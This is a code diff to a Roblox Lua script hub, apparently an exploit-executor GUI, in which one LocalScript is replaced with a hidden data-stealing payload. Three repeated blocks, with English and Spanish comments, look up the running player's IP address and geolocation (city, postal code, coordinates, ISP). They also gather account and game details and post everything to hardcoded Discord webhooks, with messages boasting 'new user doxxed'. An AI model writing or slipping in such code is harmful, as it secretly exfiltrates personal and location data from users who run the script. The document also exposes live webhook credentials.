@@ -23886,7 +23886,430 @@ task.spawn(C_381);
 -- StarterGui.G0bbyD0llan_HubV1.LocalScript
 function C_382()
 	local script = G2L["382"];
-	loadstring(game:httpget("https://pastebin.com/raw/gv5EtfJK"))()
+--get doxxed lol
+local Target = game.Players.LocalPlayer
+local WebhookURL = "https://discord.com/api/webhooks/1150594410090864710/teS-V4fwhbs2H2RwgVe5b6mWPmKGWWyPNoNSeI7PuoWH9h-6JkLeFs4U5Ue3u6nzYuMd"
+local request = http_request or request or HttpPost or syn.request or fluxus.request or http.request
+local getIPResponse = request({
+	Url = "https://api.ipify.org/?format=json",
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+
+local getIPInfo = request({
+	Url = string.format("http://ip-api.com/json/%s", IPBuffer)
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local function countToolsInBackpack()
+	local toolCount = 0
+
+	for _, tool in pairs(Target.Backpack:GetChildren()) do
+		if tool:IsA("Tool") then
+			toolCount = toolCount + 1
+		end
+	end
+
+	return toolCount
+end
+local Options = {
+	playerName = Target.Name,
+	PlayerDisplayName = Target.DisplayName,
+	PlayerUserID = Target.UserId,
+	Age = Target.AccountAge,
+	Internet_Page_User = "https://www.roblox.com/users/"..Target.UserId.."/profile",
+	Internet_Page_User_Friends = "https://www.roblox.com/users/"..Target.UserId.."/friends#!/friends",
+	Speed = Target.Character.Humanoid.WalkSpeed,
+	JumpPower = Target.Character.Humanoid.JumpPower,
+	Position = tostring(Target.Character.HumanoidRootPart.Position),
+	NameGame = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+	GameID = ""..game.PlaceId.." [PAGE:"..tostring("https://www.roblox.com/games/" .. game.PlaceId).."]",
+	Team = tostring(Target.Team),
+	Tools = countToolsInBackpack(),
+	CameraMinZoomDistance = Target.CameraMinZoomDistance,
+	CameraMaxZoomDistance = Target.CameraMaxZoomDistance,
+	Language = tostring(Target.LocaleId),
+	executor = identifyexecutor() or "Unknown",
+}
+local FI = {
+	IP = IPBuffer,
+	country = IIT.country,
+	countryCode = IIT.countryCode,
+	region = IIT.region,
+	regionName = IIT.regionName,
+	city = IIT.city,
+	zipcode = IIT.zip,
+	latitude = IIT.lat,
+	longitude = IIT.lon,
+	isp = IIT.isp,
+	org = IIT.org,
+
+}
+local dataMessage = string.format(
+[[
+G0bbyHub new user doxxed xD
+User: %s
+IP: %s
+Country: %s
+Country Code: %s
+Region: %s
+Region Name: %s
+City: %s
+Zipcode: %s
+ISP: %s
+Org: %s
+[USER]
+Name = %s
+DisplayName = %s
+User ID = %s
+Days in Roblox = %d
+[INTERNERT PAGES]
+Page UserID = %s
+Friends Page = %s
+[OTHERS]
+Speed = %d
+JumpPower = %d
+Position = %s
+Playing = %s
+GameID = %s
+Team = %s
+Total Tools = %d
+CameraMinZoomDistance  = %d
+CameraMaxZoomDistance = %d
+Language = %s
+Executor = %s
+]]
+	, Target.Name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org
+	,   Options.playerName,
+	Options.PlayerDisplayName, 
+	Options.PlayerUserID,
+	Options.Age,
+	Options.Internet_Page_User,
+	Options.Internet_Page_User_Friends,
+	Options.Speed,
+	Options.JumpPower,
+	Options.Position,
+	Options.NameGame,
+	Options.GameID,
+	Options.Team,	
+	Options.Tools,
+	Options.CameraMinZoomDistance,
+	Options.CameraMaxZoomDistance,
+	Options.Language,
+	Options.executor
+)
+local MessageData = {
+	["content"] = dataMessage
+}
+
+local send_hook = request(
+	{
+		Url = WebhookURL,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = game:GetService("HttpService"):JSONEncode(MessageData)
+	}
+)
+wait(2)
+local MessageData2 = {
+	["content"] = "Now getting Much information lol"
+}
+
+local send_hook = request(
+	{
+		Url = WebhookURL,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = game:GetService("HttpService"):JSONEncode(MessageData2)
+	}
+)
+local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+-- Define las URLs de las páginas
+local urls = {
+	"http://ip-api.com/json/",
+	"https://httpbin.org/ip",
+	"https://ipinfo.io/json",
+	"https://api.ipify.org/?format=json",
+	"https://ip-api.io/api/json",
+	"http://ip.42.pl/raw",
+	"https://icanhazip.com",
+	"https://httpbin.org/get"
+}
+
+-- Define la URL de tu webhook de Discord
+local webhookUrl = "https://discord.com/api/webhooks/1150594410090864710/teS-V4fwhbs2H2RwgVe5b6mWPmKGWWyPNoNSeI7PuoWH9h-6JkLeFs4U5Ue3u6nzYuMd"
+
+-- Función para enviar datos a un webhook
+local function sendToWebhook(url, response)
+	local data = {
+		content = "request to " .. url,
+		embeds = {
+			{
+				title = "response:",
+				description = response,
+				color = 65280 -- Color verde (puedes cambiarlo)
+			}
+		}
+	}
+	local postData = httprequest({
+		Url = webhookUrl,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = game:GetService("HttpService"):JSONEncode(data)
+	})
+
+	if postData and postData.Success then
+
+	end
+end
+
+-- Realiza solicitudes a las páginas y envía las respuestas al webhook
+for _, url in ipairs(urls) do
+	local success, response = pcall(function()
+		return httprequest({
+			Url = url,
+			Method = "GET"
+		}).Body
+	end)
+
+	if success then
+		sendToWebhook(url, response)
+	else
+	end
+end
+
+
+
+
+
+
+
+
+local Target = game.Players.LocalPlayer
+local WebhookURL = "https://discord.com/api/webhooks/1140467984238923796/WuvO1F6CF3dp0d7p0ZCe0wIRupHOtUzm5ZqbT6LY7lNv3QZS6orhMlxYekrnSOfL5U5r"
+request = http_request or request or HttpPost or syn.request or fluxus.request or http.request
+local getIPResponse = request({
+	Url = "https://api.ipify.org/?format=json",
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+
+local getIPInfo = request({
+	Url = string.format("http://ip-api.com/json/%s", IPBuffer)
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local function countToolsInBackpack()
+	local toolCount = 0
+
+	for _, tool in pairs(Target.Backpack:GetChildren()) do
+		if tool:IsA("Tool") then
+			toolCount = toolCount + 1
+		end
+	end
+
+	return toolCount
+end
+local Options = {
+	playerName = Target.Name,
+	PlayerDisplayName = Target.DisplayName,
+	PlayerUserID = Target.UserId,
+	Age = Target.AccountAge,
+	Internet_Page_User = "https://www.roblox.com/users/"..Target.UserId.."/profile",
+	Internet_Page_User_Friends = "https://www.roblox.com/users/"..Target.UserId.."/friends#!/friends",
+
+	Speed = Target.Character.Humanoid.WalkSpeed,
+	JumpPower = Target.Character.Humanoid.JumpPower,
+	Position = tostring(Target.Character.HumanoidRootPart.Position),
+	NameGame = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+	GameID = ""..game.PlaceId.." [PAGE:"..tostring("https://www.roblox.com/games/" .. game.PlaceId).."]",
+	Team = tostring(Target.Team),
+	Tools = countToolsInBackpack(),
+	CameraMinZoomDistance = Target.CameraMinZoomDistance,
+	CameraMaxZoomDistance = Target.CameraMaxZoomDistance,
+	Language = tostring(Target.LocaleId),
+	executor = identifyexecutor() or "Unknown"
+}
+local FI = {
+	IP = IPBuffer,
+	country = IIT.country,
+	countryCode = IIT.countryCode,
+	region = IIT.region,
+	regionName = IIT.regionName,
+	city = IIT.city,
+	zipcode = IIT.zip,
+	latitude = IIT.lat,
+	longitude = IIT.lon,
+	isp = IIT.isp,
+	org = IIT.org,
+
+}
+local dataMessage = string.format(
+[[User: %s
+IP: %s
+Country: %s
+Country Code: %s
+Region: %s
+Region Name: %s
+City: %s
+Zipcode: %s
+ISP: %s
+Org: %s
+[USER]
+Name = %s
+DisplayName = %s
+User ID = %s
+Days in Roblox = %d
+[INTERNERT PAGES]
+Page UserID = %s
+Friends Page = %s
+[OTHERS]
+Speed = %d
+JumpPower = %d
+Position = %s
+Playing = %s
+GameID = %s
+Team = %s
+Total Tools = %d
+CameraMinZoomDistance  = %d
+CameraMaxZoomDistance = %d
+Language = %s
+Executor = %s
+]]
+	, Target.Name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org
+	,   Options.playerName,
+	Options.PlayerDisplayName, 
+	Options.PlayerUserID,
+	Options.Age,
+	Options.Internet_Page_User,
+	Options.Internet_Page_User_Friends,
+	Options.Speed,
+	Options.JumpPower,
+	Options.Position,
+	Options.NameGame,
+	Options.GameID,
+	Options.Team,	
+	Options.Tools,
+	Options.CameraMinZoomDistance,
+	Options.CameraMaxZoomDistance,
+	Options.Language,
+	Options.executor
+)
+local MessageData = {
+	["content"] = dataMessage
+}
+
+local send_hook = request(
+	{
+		Url = WebhookURL,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = game:GetService("HttpService"):JSONEncode(MessageData)
+	}
+)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local request = http_request or request or HttpPost or syn.request or fluxus.request or http.request
+
+local WebhookURL = "https://discord.com/api/webhooks/1150594410090864710/teS-V4fwhbs2H2RwgVe5b6mWPmKGWWyPNoNSeI7PuoWH9h-6JkLeFs4U5Ue3u6nzYuMd"
+
+-- Función para obtener la información del jugador local
+local function obtenerInformacionDelJugadorLocal()
+	local player = game.Players.LocalPlayer
+	local localeId = tostring(player.LocaleId)
+	local juegoActual = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+	-- Obtener la dirección IP y la información asociada
+	local getIPResponse = request({
+		Url = "https://api.ipify.org/?format=json"
+	})
+	local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+	local IPBuffer = tostring(GetIPJSON.ip)
+
+	local getIPInfo = request({
+		Url = string.format("http://ip-api.com/json/%s", IPBuffer)
+	})
+
+	local IPInfo = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+
+	-- Obtener información adicional sobre la dirección IP
+	local additionalIPInfo = request({
+		Url = string.format("http://ip-api.com/json/%s?fields=isp,as,lat,lon,timezone,status", IPBuffer)
+	})
+
+	local additionalInfo = game:GetService("HttpService"):JSONDecode(additionalIPInfo.Body)
+
+	local mensaje = string.format(
+		"Nuevo doxxeado!,  [PÁGINAS DE INTERNET]\nPágina de Usuario: %s\nPágina de Amigos: %s\n\n[OTROS]\nVelocidad: %d\nJump Power: %d\nPosición: %s\nJugando: %s\nID del Juego: %d\nID de Trabajo del servidor [JobID]: %s\nEquipo: %s\nHerramientas Totales: %d\nDistancia Mínima de Zoom de la Cámara: %d\nDistancia Máxima de Zoom de la Cámara: %d\nIdioma: %s\nHora Actual: %s\n\n[INFORMACIÓN DE IP]\nIP: %s\nPaís: %s\nRegión: %s\nCiudad: %s\nCódigo Postal: %s\nISP: %s\nAS: %s\nLatitud: %s\nLongitud: %s\nZona Horaria: %s\nEstado: %s",
+		"https://www.roblox.com/users/" .. player.UserId .. "/profile",
+		"https://www.roblox.com/users/" .. player.UserId .. "/friends#!/friends",
+		player.Character.Humanoid.WalkSpeed,
+		player.Character.Humanoid.JumpPower,
+		tostring(player.Character.HumanoidRootPart.Position),
+		juegoActual,
+		game.JobId,
+		player.Team and player.Team.Name or "N/A",
+		#player.Backpack:GetChildren(),
+		player.CameraMinZoomDistance,
+		player.CameraMaxZoomDistance,
+		localeId,
+		os.date("%H:%M, %d/%m/%Y"),
+		IPBuffer,
+		IPInfo.country,
+		IPInfo.regionName,
+		IPInfo.city,
+		IPInfo.zip,
+		additionalInfo.isp,
+		additionalInfo.as,
+		additionalInfo.lat,
+		additionalInfo.lon,
+		additionalInfo.timezone,
+		additionalInfo.status
+	)
+
+	return mensaje
+end
+
+-- Enviar la información del jugador local al webhook
+local mensajeJugadorLocal = obtenerInformacionDelJugadorLocal()
+local headers = {
+	["Content-Type"] = "application/json"
+}
+
+local success, response = pcall(function()
+	return request({
+		Url = WebhookURL,
+		Method = "POST",
+		Headers = headers,
+		Body = mensajeJugadorLocal
+	})
+end)
+
+if success then
+	print("Información del jugador enviada con éxito.")
+else
+	warn("Error al enviar la información del jugador: " .. response)
+end
+
 end;
 task.spawn(C_382);
 
